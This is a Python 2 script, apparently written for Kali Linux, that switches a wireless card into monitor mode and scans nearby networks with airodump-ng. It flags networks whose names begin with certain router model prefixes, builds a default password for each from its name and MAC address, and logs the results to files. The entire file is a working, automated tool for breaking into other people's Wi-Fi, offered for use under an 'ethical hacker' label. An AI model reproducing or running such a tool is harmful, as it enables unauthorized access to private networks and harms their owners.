#!/usr/bin/env python27
#
# This Program Is Written For Kali Linux 2.0
# 
# TODO Scan For Default Networks Name; Guesses The Default Password Of The Network & Log The Info All Auto
#
# Disclaimer: Not Really Cracking Password, It's Just Guessing It
#
# - Ethical H4CK3R

from os import devnull,mkdir,getuid,listdir,path,chdir,getcwd,remove
from subprocess import call,Popen
from threading import Thread,Lock
from time import sleep
from csv import reader
from sys import argv

class Engine(object):
  def __init__(self,iface):
    self.wlan = iface
    self.time = 8
    self.macs = []
    self.ssid = [] 
       
  def Monitor_Mode(self):
    call(['ifconfig',self.wlan,'down'])
    call(['iwconfig',self.wlan,'mode','monitor'])
    call(['ifconfig',self.wlan,'up'])
    call(['service','network-manager','stop'])

  def Managed_Mode(self):
    call(['ifconfig',self.wlan,'down'])
    call(['iwconfig',self.wlan,'mode','managed'])
    call(['ifconfig',self.wlan,'up'])
    call(['service','network-manager','start'])

  def Scan(self):
    if Running:
     call(['clear'])
     print ('Status: On\n\n[-] Scanning: True\n[-] Networks Captured: {}'.format(Grab))
     cmd = ['airodump-ng','-a','--output-format','csv', '-w','list',self.wlan]
     scan = Popen(cmd,stderr=Devnull,stdout=Devnull)
     sleep(self.time)
     call(['pkill', 'airodump-ng'])
     self.Append()

  def Append(self):
    global Essids,Macs
    try:
     info = 'list-01.csv'
     Saved_Bssids = list(str(item).strip() for item in open('Bssids.txt','r'))
     with open(info, 'r') as AccessPoints:
      Data = reader(AccessPoints, delimiter=',')
      for line in Data:
       if len(line) >= 10:
        try:
         name  = str(line[13]).strip()
         bssid = str(line[0]).strip()
         if name != 'ESSID' and len(name) != 0 and bssid not in Saved_Bssids:
          self.macs.append(bssid)
          self.ssid.append(name)
        except:pass
        finally:
         for item in listdir('.'):
          if item.endswith('.csv'):
           remove(item)
    except:pass
    with lock:
     Essids,Macs = self.ssid,self.macs
    self.macs,self.ssid = [],[]
     
  def Clean(self):
    self.Managed_Mode()
    try:
     remove('list-01.csv')
    except:
     pass
          
def Create(name):
  if path.exists(name):
   if path.isdir(name):
    chdir(name)
    Items = list(item for item in listdir('.'))
    if 'Bssids.txt' not in Items:
     B_list = open('Bssids.txt','w')
     B_list.close()
     if 'Essids' not in Items:
      mkdir('Essids')
      return 
     else: 
      return
    else:
     if 'Essids' not in Items:
      mkdir('Essids')
      return 
     else: 
      return
  
  mkdir(name)
  chdir(name)
  B_list = open('Bssids.txt','w')
  B_list.close()
  mkdir('Essids')
  return  

def Analyze(essid):
  Type = essid[:3]
  Builds = ['TG1','DVW','DG8','U10','TC8'] 
  if Type in Builds: 
   return True
  else:
   return False

def Guess(essid,bssid):
  a,b,c = essid[:-2],[],essid[-2:]
  for i,k in enumerate(bssid):
   if i == 9 or i == 10 or i == 12 or i == 13:
    b.append(k)
   else:
    continue
  password = '{}{}{}'.format(a,''.join(b),c)
  return password

def Controller():
  while Running: 
   try:
    engine.Scan()
   except:pass

def Manage():
  global Essid,Grab
  while Running:
   if len(Macs) != 0:
    for bssid,essid in zip(Macs,Essids):
     if Analyze(essid):
      bssid = str(bssid).strip()
      List = list(str(item).strip() for item in open('Bssids.txt','r'))
      if bssid not in List:
       with open('Bssids.txt','a') as Write:
        Write.write('{}\n'.format(bssid))
       new_Essid = str(essid).strip().upper()
       Essid_Folder = list(str(item).strip().upper() for item in listdir('Essids'))
       if new_Essid not in Essid_Folder:
        mkdir('Essids/{}'.format(new_Essid))
       else:
        k = 1
        n = True
        while n:
         name = '{} {}'.format(essid,k) 
         name = str(name).strip().upper()
         if name not in Essid_Folder:
          mkdir('Essids/{}'.format(name))
          with open('Essids/{}/Info.txt'.format(name),'w') as Write:
           Write.write('Essid: {}\nPassword: {}\n\nBssid: {}\n\n'.format(essid,Guess(essid,bssid),str(bssid).upper())) 
          n = False
         else:
          k+=1
       name = str(essid).strip().upper()
       with open('Essids/{}/Info.txt'.format(name),'w') as Write:
        Write.write('Essid: {}\nPassword: {}\n\nBssid: {}\n\n'.format(name,Guess(name,bssid),str(bssid).upper())) 
        Grab+=1
            
         
def Main():
  global Devnull,Essids,Macs,engine,Running
  Devnull = open(devnull, 'w')
  Essids,Macs = [],[]
  
  Filename = str(path.splitext(argv[0])[0])
  Create(Filename)
 
  engine = Engine(iface)
  engine.Monitor_Mode()
    
  Thread(target=Controller).start()
  Thread(target=Manage).start()

  while Running:
   try:
    pass
   except KeyboardInterrupt:
    call(['clear'])
    print ('Status: Off\n\n[-] Scanning: False\n[-] Networks Captured: {}'.format(Grab))
    print('\nExiting...')
    cmd = ['pkill','airodump-ng']
    Popen(cmd,stderr=Devnull,stdout=Devnull)
    engine.Clean()
    Running = False
    
    
   
if __name__ == '__main__':
  call(['clear'])
  Grab = 0
  if not getuid():
   Running = True
   lock = Lock()
   iface = raw_input('[-] Enter Interface: ')
   if len(iface) == 0: 
    exit()
   try:
    Main()
   except KeyboardInterrupt:
    call(['clear'])
    print('Status: Off\n\n[-] Scanning: False\n[-] Networks Captured: {}'.format(Grab))
    print('\nExiting...')
    cmd = ['pkill','airodump-ng']
    Popen(cmd,stderr=Devnull,stdout=Devnull)
    engine.Clean()
    Running = False
  else:
   exit('[!] Root Access Required')
